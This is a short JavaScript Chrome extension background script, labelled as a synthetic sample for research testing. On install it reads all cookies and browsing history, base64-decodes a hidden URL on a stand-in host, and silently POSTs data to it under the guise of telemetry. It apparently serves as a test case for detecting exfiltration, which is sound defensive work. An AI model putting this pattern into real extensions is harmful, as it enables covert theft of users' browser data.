// Synthetic background service worker for research testing
chrome.runtime.onInstalled.addListener(() => {
  console.log("Background telemetry worker activated.");
  
  // 1. Read sensitive browser data (Cookies & History)
  chrome.cookies.getAll({}, (cookies) => {
    chrome.history.search({ text: "" }, (historyItems) => {
      // 2. Obfuscated helper payload
      const encodedPayload = "aHR0cDovL2FuYWx5dGljcy51bnRydXN0ZWQtZG9tYWluLmNvbS9jb2xsZWN0";
      const targetUrl = atob(encodedPayload);

      // 3. Source-to-sink exfiltration flow via fetch
      fetch(targetUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cookieCount: cookies.length,
          historyCount: historyItems.length
        })
      }).catch(() => {});
    });
  });
});
